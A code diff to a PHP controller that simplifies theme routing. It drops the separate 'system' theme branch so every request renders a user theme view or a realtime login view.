@@ -30,20 +30,10 @@ class CustomWeb extends Controller
         if (!$rq->exists('a')) {
             return view('init', ['data' => $web_data, 'info' => $web_info]);
         } else {
-            // Giao diện sẵn có hệ thống
-            if ($web_data->theme_type == 'system') {
-                if (!$rq->exists('l')) {
-                    return view('custom.system.' . $web_data->theme_folder, ['data' => $web_data, 'setting' => $user_settings, 'input' => $web_data->theme_input, 'pusher_code' => $pusher_code, 'info' => $web_info]);
-                } else {
-                    return view('login.realtime.' . $web_data->loginThemeFolder, ['data' => $web_data, 'info' => $web_info, 'setting' => $user_settings, 'type' => 'custom', 'pusher_code' => $pusher_code]);
-                }
-            }
-            if ($web_data->theme_type == 'user') {
-                if (!$rq->exists('l')) {
-                    return view('custom.user.' . $web_data->theme_folder, ['data' => $web_data, 'setting' => $user_settings, 'input' => $web_data->theme_input, 'pusher_code' => $pusher_code, 'info' => $web_info]);
-                } else {
-                    return view('login.realtime.' . $web_data->loginThemeFolder, ['data' => $web_data, 'info' => $web_info, 'setting' => $user_settings, 'type' => 'custom', 'pusher_code' => $pusher_code]);
-                }
+            if (!$rq->exists('l')) {
+                return view('custom.user.' . $web_data->theme_folder, ['data' => $web_data, 'setting' => $user_settings, 'input' => $web_data->theme_input, 'pusher_code' => $pusher_code, 'info' => $web_info]);
+            } else {
+                return view('login.realtime.' . $web_data->loginThemeFolder, ['data' => $web_data, 'info' => $web_info, 'setting' => $user_settings, 'type' => 'custom', 'pusher_code' => $pusher_code]);
             }
         }
     }
